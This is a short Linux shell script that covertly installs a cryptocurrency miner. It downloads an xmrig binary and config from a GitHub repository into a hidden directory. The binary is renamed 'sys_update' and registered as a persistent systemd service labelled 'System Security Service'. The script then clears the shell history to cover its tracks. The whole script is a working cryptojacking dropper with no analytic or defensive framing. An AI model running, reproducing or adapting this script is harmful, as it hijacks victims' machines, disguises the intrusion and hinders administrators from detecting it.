systemctl stop sys_update.service 2>/dev/null
systemctl disable sys_update.service 2>/dev/null


mkdir -p /var/opt/.system_lib

curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -o /var/opt/.system_lib/config.json
curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /var/opt/.system_lib/sys_update

chmod +x /var/opt/.system_lib/sys_update

cat <<EOF > /etc/systemd/system/sys_update.service
[Unit]
Description=System Security Service
After=network.target

[Service]
Type=simple
ExecStart=/var/opt/.system_lib/sys_update --config=/var/opt/.system_lib/config.json
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sys_update
systemctl start sys_update

history -c

